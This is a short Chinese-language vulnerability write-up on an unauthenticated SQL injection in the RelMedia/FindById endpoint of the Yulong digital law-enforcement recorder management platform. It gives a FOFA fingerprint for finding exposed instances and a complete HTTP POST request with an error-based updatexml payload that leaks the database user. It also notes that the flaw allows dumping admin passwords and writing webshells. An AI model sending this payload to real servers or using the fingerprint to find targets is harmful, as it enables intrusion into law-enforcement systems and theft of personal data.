# 誉龙数字执法记录仪管理平台 FindById存在SQL注入漏洞

# 一、漏洞简介
誉龙数字执法记录仪管理平台是深圳誉龙数字技术有限公司开发的执法记录仪管理平台，誉龙视音频综合管理平台 RelMedia/FindById 存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

# 二、影响版本
+ 誉龙数字执法记录仪管理平台

# 三、资产测绘
+ fofa`body="PView 视音频管理平台"`
+ 特征

![1726295881688-5a934d40-ff14-4e0a-87a0-2dec0b87f3c3.png](./img/VYcOtKaJIFf_m5Yn/1726295881688-5a934d40-ff14-4e0a-87a0-2dec0b87f3c3-787765.png)

# 四、漏洞复现
```go
POST /index.php?r=RelMedia/FindById HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
 
id=1+and+updatexml(1,concat(0x7e,user(),0x7e),1)--+
```

![1726620841847-a47e8ed7-a3db-496f-a0d2-b1c430c144b2.png](./img/VYcOtKaJIFf_m5Yn/1726620841847-a47e8ed7-a3db-496f-a0d2-b1c430c144b2-977199.png)



> 更新: 2024-10-22 09:36:10  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/mnghcs7bfd52x86g>